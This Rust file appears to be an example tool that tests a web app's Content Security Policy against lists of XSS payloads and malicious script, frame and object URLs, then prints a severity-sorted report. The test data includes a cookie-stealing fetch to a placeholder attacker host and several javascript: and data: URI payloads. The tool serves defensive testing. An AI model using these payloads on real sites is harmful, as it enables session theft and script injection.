use actix_web_csp::{
    security::HashGenerator, security::NonceGenerator, security::PolicyVerifier, CspPolicyBuilder,
    Source,
};
use std::borrow::Cow;
use std::collections::HashMap;

pub struct CspSecurityTester {
    policy_verifier: PolicyVerifier,
    test_results: HashMap<String, TestResult>,
}

#[derive(Debug, Clone)]
pub struct TestResult {
    pub test_name: String,
    pub passed: bool,
    pub description: String,
    pub severity: Severity,
    pub recommendation: Option<String>,
}

#[derive(Debug, Clone, PartialEq)]
pub enum Severity {
    Critical,
    High,
    Medium,
    Low,
    Info,
}

impl CspSecurityTester {
    pub fn new(policy: actix_web_csp::CspPolicy) -> Self {
        Self {
            policy_verifier: PolicyVerifier::new(policy),
            test_results: HashMap::new(),
        }
    }

    pub fn run_comprehensive_test(&mut self) -> Vec<TestResult> {
        println!("🔍 Starting CSP Security Analysis...");
        println!("{}", "=".repeat(50));

        self.test_xss_protection();
        self.test_inline_script_protection();
        self.test_external_script_protection();
        self.test_data_uri_protection();
        self.test_eval_protection();
        self.test_object_embedding_protection();
        self.test_frame_protection();
        self.test_style_injection_protection();

        self.test_nonce_security();
        self.test_hash_security();
        self.test_reporting_configuration();
        self.test_policy_completeness();

        self.test_ecommerce_security();
        self.test_payment_security();

        self.generate_report()
    }

    fn test_xss_protection(&mut self) {
        let xss_payloads = vec![
            "javascript:alert('XSS')",
            "data:text/html,<script>alert('XSS')</script>",
            "http://evil.com/xss.js",
            "https://malicious-cdn.com/payload.js",
        ];

        let mut blocked_count = 0;
        for payload in &xss_payloads {
            if let Ok(allowed) = self.policy_verifier.verify_uri(payload, "script-src") {
                if !allowed {
                    blocked_count += 1;
                }
            }
        }

        let passed = blocked_count == xss_payloads.len();
        self.test_results.insert(
            "xss_protection".to_string(),
            TestResult {
                test_name: "XSS Protection".to_string(),
                passed,
                description: format!(
                    "{}/{} XSS payloads blocked",
                    blocked_count,
                    xss_payloads.len()
                ),
                severity: if passed {
                    Severity::Info
                } else {
                    Severity::Critical
                },
                recommendation: if !passed {
                    Some(
                        "Restrict all external script sources and only allow trusted domains"
                            .to_string(),
                    )
                } else {
                    None
                },
            },
        );
    }

    fn test_inline_script_protection(&mut self) {
        let inline_scripts = vec![
            "alert('inline script')",
            "document.cookie = 'stolen=data'",
            "window.location = 'http://evil.com'",
            "fetch('http://attacker.com/steal', {method: 'POST', body: document.cookie})",
        ];

        let mut blocked_count = 0;
        for _script in &inline_scripts {
            if let Ok(blocks) = self.policy_verifier.blocks_inline_scripts() {
                if blocks {
                    blocked_count += 1;
                }
            }
        }

        let passed = blocked_count > 0;
        self.test_results.insert(
            "inline_script_protection".to_string(),
            TestResult {
                test_name: "Inline Script Protection".to_string(),
                passed,
                description: "Checked if inline scripts are blocked".to_string(),
                severity: if passed {
                    Severity::Info
                } else {
                    Severity::High
                },
                recommendation: if !passed {
                    Some("Avoid using 'unsafe-inline', use nonce or hash instead".to_string())
                } else {
                    None
                },
            },
        );
    }

    fn test_external_script_protection(&mut self) {
        let malicious_domains = vec![
            "http://evil.com/script.js",
            "https://malware-cdn.com/crypto-miner.js",
            "http://tracking-site.com/analytics.js",
            "https://suspicious-domain.ru/payload.js",
        ];

        let mut blocked_count = 0;
        for domain in &malicious_domains {
            if let Ok(allowed) = self.policy_verifier.verify_uri(domain, "script-src") {
                if !allowed {
                    blocked_count += 1;
                }
            }
        }

        let passed = blocked_count == malicious_domains.len();
        self.test_results.insert(
            "external_script_protection".to_string(),
            TestResult {
                test_name: "External Script Protection".to_string(),
                passed,
                description: format!(
                    "{}/{} malicious domains blocked",
                    blocked_count,
                    malicious_domains.len()
                ),
                severity: if passed {
                    Severity::Info
                } else {
                    Severity::High
                },
                recommendation: if !passed {
                    Some("Only allow trusted CDNs and your own domains".to_string())
                } else {
                    None
                },
            },
        );
    }

    fn test_data_uri_protection(&mut self) {
        let data_uris = vec![
            "data:text/javascript,alert('XSS')",
            "data:application/javascript,malicious_code()",
            "data:text/html,<script>alert('XSS')</script>",
        ];

        let mut blocked_count = 0;
        for uri in &data_uris {
            if let Ok(allowed) = self.policy_verifier.verify_uri(uri, "script-src") {
                if !allowed {
                    blocked_count += 1;
                }
            }
        }

        let passed = blocked_count == data_uris.len();
        self.test_results.insert(
            "data_uri_protection".to_string(),
            TestResult {
                test_name: "Data URI Protection".to_string(),
                passed,
                description: format!(
                    "{}/{} malicious data URIs blocked",
                    blocked_count,
                    data_uris.len()
                ),
                severity: if passed {
                    Severity::Info
                } else {
                    Severity::Medium
                },
                recommendation: if !passed {
                    Some("Disallow 'data:' scheme in script sources".to_string())
                } else {
                    None
                },
            },
        );
    }

    fn test_eval_protection(&mut self) {
        let passed = !self.policy_verifier.allows_unsafe_eval();

        self.test_results.insert(
            "eval_protection".to_string(),
            TestResult {
                test_name: "Eval Protection".to_string(),
                passed,
                description: if passed {
                    "eval() and similar dangerous functions are blocked".to_string()
                } else {
                    "eval() and similar functions are allowed (DANGEROUS!)".to_string()
                },
                severity: if passed {
                    Severity::Info
                } else {
                    Severity::Critical
                },
                recommendation: if !passed {
                    Some("Avoid using 'unsafe-eval', this is very dangerous".to_string())
                } else {
                    None
                },
            },
        );
    }

    fn test_object_embedding_protection(&mut self) {
        let object_sources = vec![
            "http://evil.com/malware.swf",
            "https://suspicious.com/plugin.jar",
            "data:application/x-shockwave-flash,malicious_content",
        ];

        let mut blocked_count = 0;
        for source in &object_sources {
            if let Ok(allowed) = self.policy_verifier.verify_uri(source, "object-src") {
                if !allowed {
                    blocked_count += 1;
                }
            }
        }

        let passed = blocked_count == object_sources.len();
        self.test_results.insert(
            "object_protection".to_string(),
            TestResult {
                test_name: "Object Embedding Protection".to_string(),
                passed,
                description: format!(
                    "{}/{} malicious object sources blocked",
                    blocked_count,
                    object_sources.len()
                ),
                severity: if passed {
                    Severity::Info
                } else {
                    Severity::Medium
                },
                recommendation: if !passed {
                    Some("Set object-src directive to 'none'".to_string())
                } else {
                    None
                },
            },
        );
    }

    fn test_frame_protection(&mut self) {
        let frame_sources = vec![
            "http://clickjacking-site.com",
            "https://malicious-iframe.com",
            "javascript:alert('frame XSS')",
        ];

        let mut blocked_count = 0;
        for source in &frame_sources {
            if let Ok(allowed) = self.policy_verifier.verify_uri(source, "frame-src") {
                if !allowed {
                    blocked_count += 1;
                }
            }
        }

        let passed = blocked_count == frame_sources.len();
        self.test_results.insert(
            "frame_protection".to_string(),
            TestResult {
                test_name: "Frame Protection".to_string(),
                passed,
                description: format!(
                    "{}/{} malicious frame sources blocked",
                    blocked_count,
                    frame_sources.len()
                ),
                severity: if passed {
                    Severity::Info
                } else {
                    Severity::Medium
                },
                recommendation: if !passed {
                    Some("Restrict frame-src directive or set it to 'none'".to_string())
                } else {
                    None
                },
            },
        );
    }

    fn test_style_injection_protection(&mut self) {
        let style_injections = vec![
            "http://evil.com/malicious.css",
            "data:text/css,body{background:url('javascript:alert(1)');}",
        ];

        let mut blocked_count = 0;
        for style in &style_injections {
            if let Ok(allowed) = self.policy_verifier.verify_uri(style, "style-src") {
                if !allowed {
                    blocked_count += 1;
                }
            }
        }

        let passed = blocked_count == style_injections.len();
        self.test_results.insert(
            "style_protection".to_string(),
            TestResult {
                test_name: "Style Injection Protection".to_string(),
                passed,
                description: format!(
                    "{}/{} malicious style sources blocked",
                    blocked_count,
                    style_injections.len()
                ),
                severity: if passed {
                    Severity::Info
                } else {
                    Severity::Low
                },
                recommendation: if !passed {
                    Some("Restrict style-src directive".to_string())
                } else {
                    None
                },
            },
        );
    }

    fn test_nonce_security(&mut self) {
        let nonce_gen = NonceGenerator::new(16);
        let nonce1 = nonce_gen.generate();
        let nonce2 = nonce_gen.generate();

        let passed = nonce1 != nonce2 && nonce1.len() >= 16;

        self.test_results.insert(
            "nonce_security".to_string(),
            TestResult {
                test_name: "Nonce Security".to_string(),
                passed,
                description: if passed {
                    "Nonces are unique and sufficiently long".to_string()
                } else {
                    "Nonce security issue detected".to_string()
                },
                severity: if passed {
                    Severity::Info
                } else {
                    Severity::High
                },
                recommendation: if !passed {
                    Some(
                        "Set nonce length to at least 16 bytes and renew for each request"
                            .to_string(),
                    )
                } else {
                    None
                },
            },
        );
    }

    fn test_hash_security(&mut self) {
        let hash_gen = HashGenerator;
        let test_script = "console.log('test');";

        let hash_result = hash_gen.generate_hash(test_script);
        let passed = hash_result.is_ok() && !hash_result.unwrap().is_empty();

        self.test_results.insert(
            "hash_security".to_string(),
            TestResult {
                test_name: "Hash Security".to_string(),
                passed,
                description: if passed {
                    "Hash generation works securely".to_string()
                } else {
                    "Problem detected in hash generation".to_string()
                },
                severity: if passed {
                    Severity::Info
                } else {
                    Severity::Medium
                },
                recommendation: if !passed {
                    Some("Use SHA-256 or a stronger hash algorithm".to_string())
                } else {
                    None
                },
            },
        );
    }

    fn test_reporting_configuration(&mut self) {
        let has_report_uri = self.policy_verifier.has_report_uri();
        let has_report_to = self.policy_verifier.has_report_to();

        let passed = has_report_uri || has_report_to;

        self.test_results.insert(
            "reporting_config".to_string(),
            TestResult {
                test_name: "Reporting Configuration".to_string(),
                passed,
                description: if passed {
                    "CSP violation reporting is configured".to_string()
                } else {
                    "CSP violation reporting is not configured".to_string()
                },
                severity: if passed {
                    Severity::Info
                } else {
                    Severity::Low
                },
                recommendation: if !passed {
                    Some("Add report-uri or report-to directive".to_string())
                } else {
                    None
                },
            },
        );
    }

    fn test_policy_completeness(&mut self) {
        let required_directives = vec![
            "default-src",
            "script-src",
            "style-src",
            "img-src",
            "connect-src",
            "font-src",
            "object-src",
            "media-src",
            "frame-src",
        ];

        let mut missing_directives = Vec::new();
        for directive in &required_directives {
            if !self.policy_verifier.has_directive(directive) {
                missing_directives.push(directive);
            }
        }

        let passed = missing_directives.len() <= 2;

        self.test_results.insert(
            "policy_completeness".to_string(),
            TestResult {
                test_name: "Policy Completeness".to_string(),
                passed,
                description: if missing_directives.is_empty() {
                    "All important directives are defined".to_string()
                } else {
                    format!("Missing directives: {:?}", missing_directives)
                },
                severity: if passed {
                    Severity::Info
                } else {
                    Severity::Medium
                },
                recommendation: if !passed {
                    Some("Add missing directives or cover them with default-src".to_string())
                } else {
                    None
                },
            },
        );
    }

    fn test_ecommerce_security(&mut self) {
        let ecommerce_threats = vec![
            "http://fake-payment-gateway.com",
            "https://phishing-bank.com",
            "javascript:steal_credit_card_info()",
        ];

        let mut blocked_count = 0;
        for threat in &ecommerce_threats {
            if let Ok(allowed) = self.policy_verifier.verify_uri(threat, "connect-src") {
                if !allowed {
                    blocked_count += 1;
                }
            }
        }

        let passed = blocked_count == ecommerce_threats.len();
        self.test_results.insert(
            "ecommerce_security".to_string(),
            TestResult {
                test_name: "E-commerce Security".to_string(),
                passed,
                description: format!(
                    "{}/{} e-commerce threats blocked",
                    blocked_count,
                    ecommerce_threats.len()
                ),
                severity: if passed {
                    Severity::Info
                } else {
                    Severity::High
                },
                recommendation: if !passed {
                    Some("Only allow connections to trusted payment gateways".to_string())
                } else {
                    None
                },
            },
        );
    }

    fn test_payment_security(&mut self) {
        let payment_domains = vec![
            "https://secure-payment.com",
            "https://trusted-bank.com",
            "https://verified-gateway.com",
        ];

        let mut allowed_count = 0;
        for domain in &payment_domains {
            if let Ok(allowed) = self.policy_verifier.verify_uri(domain, "connect-src") {
                if allowed {
                    allowed_count += 1;
                }
            }
        }

        let passed = allowed_count > 0;

        self.test_results.insert(
            "payment_security".to_string(),
            TestResult {
                test_name: "Payment Security".to_string(),
                passed,
                description: format!(
                    "{}/{} trusted payment domains are allowed",
                    allowed_count,
                    payment_domains.len()
                ),
                severity: if passed {
                    Severity::Info
                } else {
                    Severity::Medium
                },
                recommendation: if !passed {
                    Some("Add trusted payment gateways to connect-src".to_string())
                } else {
                    None
                },
            },
        );
    }

    fn generate_report(&self) -> Vec<TestResult> {
        let mut results: Vec<TestResult> = self.test_results.values().cloned().collect();
        results.sort_by(|a, b| {
            let severity_order = |s: &Severity| match s {
                Severity::Critical => 0,
                Severity::High => 1,
                Severity::Medium => 2,
                Severity::Low => 3,
                Severity::Info => 4,
            };

            severity_order(&a.severity)
                .cmp(&severity_order(&b.severity))
                .then(a.test_name.cmp(&b.test_name))
        });

        let total_tests = results.len();
        let passed_tests = results.iter().filter(|r| r.passed).count();
        let critical_issues = results
            .iter()
            .filter(|r| r.severity == Severity::Critical && !r.passed)
            .count();
        let high_issues = results
            .iter()
            .filter(|r| r.severity == Severity::High && !r.passed)
            .count();

        println!("\n📊 CSP Security Analysis Report");
        println!("{}", "=".repeat(50));
        println!("Total Tests: {}", total_tests);
        println!(
            "Passed: {} ({}%)",
            passed_tests,
            (passed_tests * 100) / total_tests
        );
        println!("Failed: {}", total_tests - passed_tests);
        println!("Critical Issues: {}", critical_issues);
        println!("High Priority Issues: {}", high_issues);
        println!();

        for result in &results {
            let status_icon = if result.passed { "✅" } else { "❌" };
            let severity_icon = match result.severity {
                Severity::Critical => "🔴",
                Severity::High => "🟠",
                Severity::Medium => "🟡",
                Severity::Low => "🔵",
                Severity::Info => "ℹ️",
            };

            println!(
                "{} {} {} - {}",
                status_icon, severity_icon, result.test_name, result.description
            );

            if let Some(ref recommendation) = result.recommendation {
                println!("   💡 Recommendation: {}", recommendation);
            }
        }

        println!("\n🎯 Overall Assessment:");
        if critical_issues == 0 && high_issues == 0 {
            println!("🟢 Your CSP configuration looks secure!");
        } else if critical_issues > 0 {
            println!("🔴 CRITICAL security issues detected! Must be fixed immediately.");
        } else if high_issues > 0 {
            println!("🟠 High priority security issues found. Fixing is recommended.");
        } else {
            println!("🟡 Some improvements can be made.");
        }

        results
    }
}

fn main() {
    println!("🛡️ CSP Security Test Tool");
    println!("This tool evaluates the security level of your CSP policy.\n");

    let policy = CspPolicyBuilder::new()
        .default_src([Source::Self_])
        .script_src([
            Source::Self_,
            Source::Nonce(Cow::Borrowed("test-nonce")),
            Source::Host(Cow::Borrowed("cdn.example.com")),
        ])
        .style_src([
            Source::Self_,
            Source::UnsafeInline,
            Source::Host(Cow::Borrowed("fonts.googleapis.com")),
        ])
        .img_src([
            Source::Self_,
            Source::Scheme(Cow::Borrowed("data")),
            Source::Scheme(Cow::Borrowed("https")),
        ])
        .connect_src([Source::Self_, Source::Scheme(Cow::Borrowed("https"))])
        .font_src([Source::Self_])
        .object_src([Source::None])
        .media_src([Source::Self_])
        .frame_src([Source::None])
        .report_uri("/csp-report")
        .build_unchecked();

    let mut tester = CspSecurityTester::new(policy);
    let _results = tester.run_comprehensive_test();

    println!("\n🔧 Test completed! You can improve security by applying the recommendations.");
}
